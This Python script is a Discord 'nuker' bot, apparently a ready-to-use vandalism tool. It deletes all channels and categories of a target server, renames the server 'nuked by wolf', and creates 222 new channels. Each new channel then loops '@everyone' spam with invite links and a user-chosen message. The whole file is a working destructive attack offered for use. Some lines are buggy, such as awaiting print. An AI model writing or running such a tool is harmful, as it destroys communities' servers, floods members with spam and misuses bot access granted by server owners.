import discord
from discord.ext import commands
from colorama import init, Fore
import asyncio
import time

print(Fore.LIGHTRED_EX +  "my dis wollfaxak")
print(Fore.LIGHTRED_EX + '''
                     /$$                          
                    | $$                          
 /$$$$$$$  /$$   /$$| $$   /$$  /$$$$$$   /$$$$$$ 
| $$__  $$| $$  | $$| $$  /$$/ /$$__  $$ /$$__  $$
| $$  \ $$| $$  | $$| $$$$$$/ | $$$$$$$$| $$  \__/
| $$  | $$| $$  | $$| $$_  $$ | $$_____/| $$      
| $$  | $$|  $$$$$$/| $$ \  $$|  $$$$$$$| $$      
|__/  |__/ \______/ |__/  \__/ \_______/|__/      
                   
                  ''')

intents = discord.Intents.all()
bot = discord.Client(intents=intents)
token = input(Fore.RED + "your bot token: ")
guild_id = input("server id: ")
spam_message = input("spam: ")
new_channels_name = input("new channels name: ")
async def send_message_periodically(channel):
    while True:
        await channel.send("@everyone nuked by https://discord.gg/7FHkv7Z2wN https://discord.gg/xvtqYBNY and https://discord.gg/q8fK8JkR " + spam_message)
        await asyncio.sleep(0)
        print(Fore.LIGHTRED_EX + "spammed:", channel.name)

@bot.event
async def on_ready():
    print(f"wolf is ready as {bot.user}")

    
    guild = bot.get_guild(int(guild_id))

    if guild is None:
        print("server id error")
        return
    
    if guild:
        ignore_channel_name = "wolf SMRDI"

        
        categories = [category for category in guild.categories if category.name != ignore_channel_name]
        text_channels = [channel for channel in guild.text_channels if channel.name != ignore_channel_name]
        voice_channels = [channel for channel in guild.voice_channels if channel.name != ignore_channel_name]

    for channel in text_channels:
        try:
            await channel.delete()
            await asyncio.sleep(0)
            print("deleted:", channel.name)
        except:
            pass
    for channel in voice_channels:
        try:
            await channel.delete()
            await asyncio.sleep(0)
            print("deleted:", channel.name)
        except:
            pass
    for category in categories:
        try:
            await category.delete()
            await asyncio.sleep(0)
            print("deleted", category.name)
        except:
            pass
    try:
        
        await guild.edit(name="nuked by wolf")
        await print("server name zmenen")
    except:
        print("name edit error")
    try:
         
        await guild.edit(icon=True)
        await print("server pfp changed")
    except:
        print("pfp edit error")

    channels = []
    for i in range(222):
        channel_name = new_channels_name
        channel = await guild.create_text_channel(channel_name)
        channels.append(channel)
        await asyncio.sleep(0)
        print("created:", channel.name)
        
        bot.loop.create_task(send_message_periodically(channel))

bot.run(token)